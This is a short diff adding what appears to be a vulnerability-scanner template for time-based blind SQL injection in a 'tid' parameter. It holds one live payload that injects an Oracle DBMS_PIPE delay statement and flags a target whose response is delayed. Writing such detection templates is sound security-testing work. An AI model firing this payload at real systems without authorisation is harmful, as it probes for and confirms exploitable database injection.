@@ -1,0 +1,19 @@
+id: sqli-time3-140
+name: 'Delay probe in tid'
+severity: high
+type: active
+tags:
+  - sqli
+  - injection
+  - blind
+  - time
+description: '3-second delay via tid'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      tid:
+        - ''';SELECT DBMS_PIPE.RECEIVE_MESSAGE(''a'',3) FROM dual--'
+    matchers:
+      - type: time
+        ms: 2500
